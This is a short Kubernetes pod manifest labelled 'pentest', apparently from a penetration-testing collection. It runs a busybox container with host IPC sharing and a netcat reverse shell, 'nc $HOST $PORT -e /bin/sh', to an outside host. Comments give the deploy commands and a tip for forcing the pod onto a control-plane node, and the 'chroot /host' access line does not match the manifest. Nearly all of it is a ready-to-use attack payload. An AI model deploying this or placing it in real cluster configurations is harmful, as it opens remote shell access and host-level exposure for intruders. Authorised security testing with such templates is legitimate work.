###########################################################
## Deploy: kubectl -n [namespace] apply -f hostipc-revshell-pod.yaml 
## Access: kubectl -n [namespace] exec -it hostipc-revshell-pod -- chroot /host
## Remove: kubectl -n [namespace] delete hostipc-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostipc-revshell-pod
  labels:
    app: pentest
spec:
  hostIPC: true
  containers:
  - name: hostipc
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
